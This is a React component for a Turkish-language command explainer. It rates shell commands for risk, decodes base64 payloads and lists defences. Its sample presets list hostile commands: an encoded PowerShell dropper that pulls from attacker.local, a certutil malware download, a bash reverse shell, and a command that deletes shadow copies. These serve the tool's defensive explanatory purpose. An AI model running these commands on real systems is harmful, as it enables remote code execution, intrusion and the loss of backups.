import React, { useState, useMemo } from 'react';
import {
  X,
  Terminal,
  ShieldAlert,
  ShieldCheck,
  AlertTriangle,
  Code,
  Copy,
  Check,
  Sparkles,
  Info,
  Bot,
  Layers,
  Loader2,
  RefreshCw,
} from 'lucide-react';
import ReactMarkdown from 'react-markdown';
import {
  explainCommand,
  CommandExplainerResult,
  CommandExplainerContext,
} from '../services/commandExplainer';

interface CommandExplainerModalProps {
  isOpen: boolean;
  onClose: () => void;
  initialCommand?: string;
  context?: CommandExplainerContext | null;
}

export const CommandExplainerModal: React.FC<CommandExplainerModalProps> = ({
  isOpen,
  onClose,
  initialCommand = '',
  context,
}) => {
  const [commandInput, setCommandInput] = useState<string>(initialCommand);
  const [copied, setCopied] = useState(false);
  const [copiedDecoded, setCopiedDecoded] = useState(false);
  const [activeTab, setActiveTab] = useState<'ai_narrative' | 'tokens'>('ai_narrative');
  const [aiCustomText, setAiCustomText] = useState<string | null>(null);
  const [isGeneratingAi, setIsGeneratingAi] = useState(false);
  const [aiSource, setAiSource] = useState<string | null>(null);

  // Update input if initialCommand changes when opening
  React.useEffect(() => {
    if (initialCommand) {
      setCommandInput(initialCommand);
      setAiCustomText(null);
    }
  }, [initialCommand]);

  // Fast offline deterministic analysis
  const localAnalysis: CommandExplainerResult | null = useMemo(() => {
    if (!commandInput.trim()) return null;
    return explainCommand(commandInput, context || undefined);
  }, [commandInput, context]);

  // Active explanation text (Gemini AI text if fetched, otherwise rich local narrative markdown)
  const currentMarkdown = aiCustomText || localAnalysis?.fullNarrativeMarkdown || '';

  const handleFetchAi = async () => {
    if (!commandInput.trim()) return;
    setIsGeneratingAi(true);
    try {
      const resp = await fetch('/api/ai/explain-command', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ command: commandInput, context }),
      });
      if (resp.ok) {
        const data = await resp.json();
        if (data.result?.fullNarrativeMarkdown) {
          setAiCustomText(data.result.fullNarrativeMarkdown);
        } else if (data.aiExplanation) {
          setAiCustomText(data.aiExplanation);
        }
        setAiSource(data.source || 'gemini-3.8-flash');
      }
    } catch (err) {
      console.warn('AI explanation fetch error, using local rich engine:', err);
    } finally {
      setIsGeneratingAi(false);
    }
  };

  if (!isOpen) return null;

  const handleCopyExplanation = () => {
    if (!currentMarkdown) return;
    navigator.clipboard.writeText(currentMarkdown);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  const getRiskBadgeColor = (level: CommandExplainerResult['riskLevel']) => {
    switch (level) {
      case 'KRİTİK':
        return 'bg-rose-500/20 text-rose-300 border-rose-500/30';
      case 'YÜKSEK':
        return 'bg-amber-500/20 text-amber-300 border-amber-500/30';
      case 'ORTA':
        return 'bg-yellow-500/20 text-yellow-300 border-yellow-500/30';
      case 'DÜŞÜK':
        return 'bg-blue-500/20 text-blue-300 border-blue-500/30';
      default:
        return 'bg-slate-500/20 text-slate-300 border-slate-500/30';
    }
  };

  const getTroubleBadgeColor = (status: CommandExplainerResult['willCauseTrouble']) => {
    switch (status) {
      case 'EVET_YUKSEK':
        return 'bg-rose-950/40 border-rose-600/40 text-rose-200';
      case 'POTANSIYEL':
        return 'bg-amber-950/40 border-amber-600/40 text-amber-200';
      default:
        return 'bg-emerald-950/40 border-emerald-600/40 text-emerald-200';
    }
  };

  const samplePresets = [
    {
      label: 'PowerShell Gizli Dropper',
      cmd: 'powershell.exe -nop -w hidden -ep bypass -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AYQB0AHQAYQBjAGsAZQByAC4AbABvAGMAYQBsAC8AcABheQBsAG8AYQBkAC4AcABzADEAJwApAA==',
    },
    {
      label: 'Vssadmin Gölge Kopya İmha',
      cmd: 'vssadmin.exe delete shadows /all /quiet',
    },
    {
      label: 'Certutil LOLBAS İndirme',
      cmd: 'certutil.exe -urlcache -split -f http://malicious.site/beacon.exe C:\\temp\\svchost.exe',
    },
    {
      label: 'Linux Bash Ters Kabuk',
      cmd: 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1',
    },
    {
      label: 'Nginx Servis Kontrolü (Meşru)',
      cmd: 'systemctl status nginx',
    },
    {
      label: 'Whoami Yetki Keşfi',
      cmd: 'whoami /priv',
    },
  ];

  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center p-2 sm:p-4 bg-slate-950/80 backdrop-blur-xs animate-in fade-in duration-150">
      <div className="bg-slate-900 border border-slate-800 rounded-2xl w-full max-w-5xl max-h-[94vh] flex flex-col shadow-2xl overflow-hidden text-slate-100">
        
        {/* Header */}
        <div className="px-5 py-3.5 border-b border-slate-800 bg-slate-950 flex items-center justify-between">
          <div className="flex items-center gap-3">
            <div className="p-2 bg-indigo-500/20 text-indigo-400 rounded-lg border border-indigo-500/30">
              <Bot className="w-5 h-5 text-indigo-400" />
            </div>
            <div>
              <div className="flex items-center gap-2">
                <h3 className="text-base font-bold text-white tracking-wide flex items-center gap-2">
                  <span>Komut Açıklayıcı</span>
                </h3>
                <span className="px-2 py-0.5 rounded text-[10px] font-bold bg-indigo-500/20 text-indigo-300 border border-indigo-500/30">
                  {isGeneratingAi ? 'İnceleniyor...' : 'Hazır'}
                </span>
              </div>
              <p className="text-xs text-slate-400">
                Komutun ne olduğunu, kullanım amaçlarını, parametrelerini ve sistemdeki olası etkilerini detaylı olarak açıklar.
              </p>
            </div>
          </div>
          <button
            onClick={onClose}
            className="p-1.5 text-slate-400 hover:text-white hover:bg-slate-800 rounded-lg transition-colors cursor-pointer"
          >
            <X className="w-5 h-5" />
          </button>
        </div>

        {/* Input & Presets Section */}
        <div className="p-4 border-b border-slate-800/80 bg-slate-950/60 space-y-2.5">
          <div className="flex items-center justify-between text-xs flex-wrap gap-2">
            <label className="font-semibold text-slate-300 flex items-center gap-1.5">
              <Code className="w-3.5 h-3.5 text-indigo-400" />
              <span>Açıklanmasını İstediğiniz Komut veya Süreç</span>
            </label>
            <div className="flex items-center gap-1.5 overflow-x-auto text-[11px] max-w-full">
              <span className="text-slate-500 shrink-0">Hızlı Deneme:</span>
              {samplePresets.map((preset, idx) => (
                <button
                  key={idx}
                  type="button"
                  onClick={() => {
                    setCommandInput(preset.cmd);
                    setAiCustomText(null);
                  }}
                  className="px-2 py-0.5 rounded bg-slate-800 hover:bg-slate-700 text-slate-300 border border-slate-700 transition-colors cursor-pointer shrink-0"
                >
                  {preset.label}
                </button>
              ))}
            </div>
          </div>

          <div className="relative">
            <textarea
              value={commandInput}
              onChange={(e) => {
                setCommandInput(e.target.value);
                setAiCustomText(null);
              }}
              placeholder="Açıklamak istediğiniz komutu buraya yapıştırın (örnek: powershell -nop -w hidden -enc... veya vssadmin delete shadows /all /quiet)..."
              rows={2}
              className="w-full font-mono text-xs p-3 bg-slate-900 text-slate-100 rounded-xl border border-slate-700 focus:outline-hidden focus:ring-2 focus:ring-indigo-500 focus:border-transparent transition-all placeholder:text-slate-600 leading-relaxed"
            />
            {commandInput && (
              <button
                type="button"
                onClick={() => {
                  setCommandInput('');
                  setAiCustomText(null);
                }}
                className="absolute top-2 right-2 text-slate-500 hover:text-slate-300 text-xs px-2 py-0.5 bg-slate-800 rounded cursor-pointer"
              >
                Temizle
              </button>
            )}
          </div>

          {/* Action & View Toggles */}
          {localAnalysis && (
            <div className="flex items-center justify-between pt-1 flex-wrap gap-2 text-xs">
              <div className="flex items-center gap-1 bg-slate-900 p-0.5 rounded-lg border border-slate-800">
                <button
                  type="button"
                  onClick={() => setActiveTab('ai_narrative')}
                  className={`px-3 py-1 rounded-md font-semibold transition-colors cursor-pointer flex items-center gap-1.5 ${
                    activeTab === 'ai_narrative'
                      ? 'bg-indigo-600 text-white shadow-xs'
                      : 'text-slate-400 hover:text-slate-200'
                  }`}
                >
                  <Bot className="w-3.5 h-3.5" />
                  <span>Detaylı Açıklama</span>
                </button>
                <button
                  type="button"
                  onClick={() => setActiveTab('tokens')}
                  className={`px-3 py-1 rounded-md font-semibold transition-colors cursor-pointer flex items-center gap-1.5 ${
                    activeTab === 'tokens'
                      ? 'bg-indigo-600 text-white shadow-xs'
                      : 'text-slate-400 hover:text-slate-200'
                  }`}
                >
                  <Layers className="w-3.5 h-3.5" />
                  <span>Parametre Tablosu</span>
                </button>
              </div>

              <div className="flex items-center gap-2">
                <button
                  type="button"
                  onClick={handleFetchAi}
                  disabled={isGeneratingAi}
                  className="px-3 py-1 bg-gradient-to-r from-indigo-600 to-violet-600 hover:from-indigo-500 hover:to-violet-500 text-white rounded-lg text-xs font-bold flex items-center gap-1.5 transition-all cursor-pointer shadow-xs disabled:opacity-60"
                  title="Detaylı analiz talep edin"
                >
                  {isGeneratingAi ? (
                    <Loader2 className="w-3.5 h-3.5 animate-spin" />
                  ) : (
                    <Sparkles className="w-3.5 h-3.5 text-amber-300" />
                  )}
                  <span>{isGeneratingAi ? 'İnceleniyor...' : 'Derinleştirilmiş Analiz'}</span>
                </button>

                <button
                  type="button"
                  onClick={handleCopyExplanation}
                  className="px-3 py-1 bg-slate-800 hover:bg-slate-700 text-slate-200 border border-slate-700 rounded-lg text-xs font-semibold flex items-center gap-1.5 transition-colors cursor-pointer"
                >
                  {copied ? <Check className="w-3.5 h-3.5 text-emerald-400" /> : <Copy className="w-3.5 h-3.5" />}
                  <span>{copied ? 'Kopyalandı' : 'Raporu Kopyala'}</span>
                </button>
              </div>
            </div>
          )}
        </div>

        {/* Analysis Output Body */}
        <div className="flex-1 overflow-y-auto p-5 space-y-4">
          {localAnalysis ? (
            <>
              {/* Verdict & Question Answer Cards */}
              <div className="grid grid-cols-1 md:grid-cols-3 gap-3">
                {/* 1. Risk Level */}
                <div className="bg-slate-950/80 border border-slate-800 rounded-xl p-3.5 space-y-1.5">
                  <div className="flex items-center justify-between">
                    <span className="text-[11px] font-bold text-slate-400 uppercase tracking-wider">Risk Düzeyi</span>
                    <span className={`px-2 py-0.5 rounded-full text-xs font-bold border ${getRiskBadgeColor(localAnalysis.riskLevel)}`}>
                      {localAnalysis.riskLevel}
                    </span>
                  </div>
                  <div className="text-sm font-bold text-white pt-0.5">
                    {localAnalysis.category}
                  </div>
                  <div className="text-[11px] text-slate-400">
                    Ekosistem: <span className="text-indigo-300 font-semibold">{localAnalysis.ecosystem}</span>
                  </div>
                </div>

                {/* 2. Will It Cause Trouble / Harm? */}
                <div className={`border rounded-xl p-3.5 space-y-1.5 md:col-span-2 ${getTroubleBadgeColor(localAnalysis.willCauseTrouble)}`}>
                  <div className="flex items-center gap-2">
                    {localAnalysis.willCauseTrouble === 'EVET_YUKSEK' ? (
                      <AlertTriangle className="w-4 h-4 text-rose-400 shrink-0" />
                    ) : localAnalysis.willCauseTrouble === 'POTANSIYEL' ? (
                      <Info className="w-4 h-4 text-amber-400 shrink-0" />
                    ) : (
                      <ShieldCheck className="w-4 h-4 text-emerald-400 shrink-0" />
                    )}
                    <span className="text-xs font-bold uppercase tracking-wider">
                      Bu Komut Sistemde Sorun Çıkartır mı?
                    </span>
                  </div>
                  <p className="text-xs font-medium leading-relaxed">
                    {localAnalysis.willCauseTroubleText}
                  </p>
                </div>
              </div>

              {/* Decoded Base64 Section (If present) */}
              {localAnalysis.decodedPayload && (
                <div className="bg-amber-950/30 border border-amber-500/40 rounded-xl p-3.5 space-y-2">
                  <div className="flex items-center justify-between">
                    <span className="text-xs font-bold text-amber-400 uppercase tracking-wider flex items-center gap-1.5">
                      <Sparkles className="w-4 h-4 text-amber-400" />
                      <span>Otomatik Çözülen Gizli Yük (Base64 Decoded Payload)</span>
                    </span>
                    <button
                      type="button"
                      onClick={() => {
                        if (localAnalysis.decodedPayload) {
                          navigator.clipboard.writeText(localAnalysis.decodedPayload);
                          setCopiedDecoded(true);
                          setTimeout(() => setCopiedDecoded(false), 2000);
                        }
                      }}
                      className="text-xs text-amber-300 hover:text-white flex items-center gap-1 cursor-pointer"
                    >
                      {copiedDecoded ? <Check className="w-3 h-3 text-emerald-400" /> : <Copy className="w-3 h-3" />}
                      <span>{copiedDecoded ? 'Kopyalandı' : 'Yükü Kopyala'}</span>
                    </button>
                  </div>
                  <pre className="p-3 bg-slate-950 text-emerald-400 rounded-lg font-mono text-xs overflow-x-auto whitespace-pre-wrap border border-slate-800 max-h-36">
                    {localAnalysis.decodedPayload}
                  </pre>
                </div>
              )}

              {/* Main Content Area based on Tab */}
              {activeTab === 'ai_narrative' ? (
                /* Detaylı Açıklama Görünümü */
                <div className="bg-slate-950 border border-slate-800 rounded-xl p-5 text-slate-200">
                  <div className="prose prose-invert prose-indigo max-w-none text-xs sm:text-sm leading-relaxed space-y-3">
                    <ReactMarkdown
                      components={{
                        h2: ({ node, ...props }) => (
                          <h2 className="text-sm sm:text-base font-bold text-indigo-300 border-b border-slate-800 pb-1.5 mt-5 mb-2 flex items-center gap-2" {...props} />
                        ),
                        h3: ({ node, ...props }) => (
                          <h3 className="text-xs sm:text-sm font-semibold text-slate-200 mt-3 mb-1" {...props} />
                        ),
                        p: ({ node, ...props }) => (
                          <p className="text-slate-300 leading-relaxed mb-2" {...props} />
                        ),
                        ul: ({ node, ...props }) => (
                          <ul className="list-disc pl-5 space-y-1 text-slate-300 my-2" {...props} />
                        ),
                        ol: ({ node, ...props }) => (
                          <ol className="list-decimal pl-5 space-y-1.5 text-slate-300 my-2" {...props} />
                        ),
                        li: ({ node, ...props }) => (
                          <li className="leading-relaxed" {...props} />
                        ),
                        strong: ({ node, ...props }) => (
                          <strong className="font-bold text-white" {...props} />
                        ),
                        code: ({ node, className, children, ...props }) => (
                          <code className="px-1.5 py-0.5 bg-slate-900 text-indigo-300 rounded font-mono text-[11px] border border-slate-800" {...props}>
                            {children}
                          </code>
                        ),
                        blockquote: ({ node, ...props }) => (
                          <blockquote className="border-l-2 border-indigo-500 pl-3 py-1 my-2 bg-indigo-950/20 text-slate-300 text-xs italic rounded-r" {...props} />
                        ),
                        table: ({ node, ...props }) => (
                          <div className="overflow-x-auto my-3">
                            <table className="w-full text-left text-xs border-collapse border border-slate-800" {...props} />
                          </div>
                        ),
                        th: ({ node, ...props }) => (
                          <th className="p-2 bg-slate-900 border border-slate-800 font-bold text-slate-200 text-[11px]" {...props} />
                        ),
                        td: ({ node, ...props }) => (
                          <td className="p-2 border border-slate-800/80 text-slate-300 text-[11px]" {...props} />
                        ),
                      }}
                    >
                      {currentMarkdown}
                    </ReactMarkdown>
                  </div>
                </div>
              ) : (
                /* Tokens Table View */
                <div className="space-y-4">
                  {/* Token-by-Token Dissection */}
                  <div className="bg-slate-950 border border-slate-800 rounded-xl p-4 space-y-3">
                    <h5 className="text-xs font-bold text-slate-300 uppercase tracking-wider flex items-center gap-1.5">
                      <Layers className="w-4 h-4 text-indigo-400" />
                      <span>Komut Bileşenleri ve Parametre Ayrıştırması ({localAnalysis.tokens.length})</span>
                    </h5>
                    <div className="divide-y divide-slate-800/80">
                      {localAnalysis.tokens.map((token, tIdx) => (
                        <div key={tIdx} className="py-2.5 flex flex-col sm:flex-row sm:items-start justify-between gap-2 text-xs">
                          <div className="flex items-center gap-2 shrink-0">
                            <code className="px-2 py-1 bg-slate-900 text-indigo-300 rounded font-mono font-bold border border-slate-800">
                              {token.token}
                            </code>
                            <span className="px-1.5 py-0.5 rounded text-[10px] font-medium bg-slate-800 text-slate-400 uppercase">
                              {token.role}
                            </span>
                          </div>
                          <div className="flex-1 text-slate-300 sm:text-right">
                            <span>{token.meaning}</span>
                            {token.riskNote && (
                              <div className="text-[11px] text-amber-400 font-semibold mt-0.5">
                                ⚠️ {token.riskNote}
                              </div>
                            )}
                          </div>
                        </div>
                      ))}
                    </div>
                  </div>

                  {/* Security Impacts & Countermeasures */}
                  <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                    <div className="bg-rose-950/20 border border-rose-900/30 rounded-xl p-4 space-y-2">
                      <h5 className="text-xs font-bold text-rose-300 uppercase tracking-wider flex items-center gap-1.5">
                        <AlertTriangle className="w-4 h-4 text-rose-400" />
                        <span>Güvenlik ve Adli Etkiler</span>
                      </h5>
                      <ul className="space-y-1.5 text-xs text-slate-300">
                        {localAnalysis.securityImplications.map((imp, iIdx) => (
                          <li key={iIdx} className="flex items-start gap-1.5">
                            <span className="text-rose-400 font-bold">•</span>
                            <span>{imp}</span>
                          </li>
                        ))}
                      </ul>
                    </div>

                    <div className="bg-emerald-950/20 border border-emerald-900/30 rounded-xl p-4 space-y-2">
                      <h5 className="text-xs font-bold text-emerald-300 uppercase tracking-wider flex items-center gap-1.5">
                        <ShieldCheck className="w-4 h-4 text-emerald-400" />
                        <span>Önerilen Önlemler &amp; Savunma</span>
                      </h5>
                      <ul className="space-y-1.5 text-xs text-slate-300">
                        {localAnalysis.recommendedDefenses.map((def, dIdx) => (
                          <li key={dIdx} className="flex items-start gap-1.5">
                            <span className="text-emerald-400 font-bold">•</span>
                            <span>{def}</span>
                          </li>
                        ))}
                      </ul>
                    </div>
                  </div>
                </div>
              )}
            </>
          ) : (
            <div className="py-12 text-center text-slate-500 space-y-3">
              <Bot className="w-12 h-12 text-indigo-400/50 mx-auto" />
              <p className="text-sm font-semibold text-slate-300">
                Açıklamak istediğiniz komut satırını yukarıya yapıştırın veya yukarıdaki hazır örneklerden birini seçin.
              </p>
              <p className="text-xs text-slate-500 max-w-lg mx-auto">
                Komutun ne işe yaradığını, normalde kimlerin kullandığını, olası etkilerini ve güvenlik risklerini detaylı olarak öğrenebilirsiniz.
              </p>
            </div>
          )}
        </div>

        {/* Footer */}
        <div className="px-5 py-3 border-t border-slate-800 bg-slate-950 flex items-center justify-between text-xs text-slate-400">
          <div className="flex items-center gap-2">
            <span className="w-2 h-2 rounded-full bg-emerald-400 inline-block animate-pulse"></span>
            <span>Komut ve Davranış Analizi</span>
          </div>
          <button
            onClick={onClose}
            className="px-4 py-1.5 bg-slate-800 hover:bg-slate-700 text-slate-200 rounded-lg font-medium transition-colors cursor-pointer"
          >
            Kapat
          </button>
        </div>

      </div>
    </div>
  );
};
